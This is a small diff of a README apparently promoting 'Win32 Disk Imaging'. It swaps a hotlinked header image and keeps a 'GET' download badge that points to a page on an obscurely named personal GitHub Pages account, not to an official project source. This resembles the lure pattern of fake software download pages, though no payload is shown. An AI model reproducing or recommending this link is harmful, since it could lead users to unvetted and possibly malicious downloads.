@@ -1,6 +1,6 @@
 # Win32 Disk Imaging — ISO Writing, USB Preparation & Storage Workflows
 
-![Win32 Disk Imager](https://psenyukov.ru/wp-content/uploads/2019/03/win32diskimager-logo.jpg)
+![Win32 Disk Imager](https://img.kaspersky.com/oh/KRD/2024/ru-RU/screen_win32_disk_imager.png)
 
 [![GET — Win32 Disk Imaging](https://img.shields.io/badge/GET%20%E2%80%94%20Win32%20Disk%20Imaging-0078D6?style=for-the-badge&logoColor=white)](https://sllvjng19260.github.io/.github/Win32-Disk-Imaging)
 
